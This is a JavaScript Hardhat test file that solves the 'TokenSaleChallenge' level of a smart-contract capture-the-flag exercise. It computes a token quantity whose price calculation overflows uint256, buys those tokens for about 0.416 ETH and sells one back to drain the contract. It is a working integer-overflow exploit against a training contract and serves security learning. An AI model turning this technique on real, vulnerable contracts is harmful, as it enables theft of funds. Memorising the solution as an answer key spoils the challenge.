const { assert } = require("chai");
const { BigNumber } = require("ethers");
const { accessListify } = require("ethers/lib/utils");
const { ethers, getNamedAccounts } = require("hardhat");

describe("07-TokenSaleChallenge", function () {
    let predictTheBlockHashContract, value, player;
    beforeEach(async function () {
        //make a snapshot by calling fixture
        await deployments.fixture("7");
        player = (await getNamedAccounts()).player;
        value = ethers.utils.parseEther("1");
        tokenSaleContract = await ethers.getContract("TokenSaleChallenge", player);
    });

    describe("", async function () {
        it("find out overflow value", async function () {
            /** numberOfTokens = 2^256 / 10^18 + 1
             * numberOfTokens will be multiplied again with 10^18 in tokenSaleContract.buy() -> will overflow;
             * ethAmount = numberOfTokens *10^18 - MaxUint256; ether.js BN can't keep up with this value so take it
             * from smart contract*/

            const numberOfTokens = ethers.constants.MaxUint256.div(
                ethers.utils.parseEther("1")
            ).add(1);
            //get eth value from smart contract
            const tx = await tokenSaleContract.buy(numberOfTokens, {
                value: ethers.BigNumber.from("415992086870360064"),
            });

            await tx.wait();
            let playerToken = await tokenSaleContract.balanceOf(player);
            let contractEth = await ethers.provider.getBalance(tokenSaleContract.address);

            console.log(`playerToken: ${playerToken}, contractEth: ${contractEth}`);
            await tokenSaleContract.sell(1);
            playerToken = await tokenSaleContract.balanceOf(player);
            contractEth = await ethers.provider.getBalance(tokenSaleContract.address);
            const isComplete = await tokenSaleContract.isComplete();

            console.log(`playerToken: ${playerToken}, contractEth: ${contractEth}`);
            assert.equal(isComplete, true);
        });
    });
});
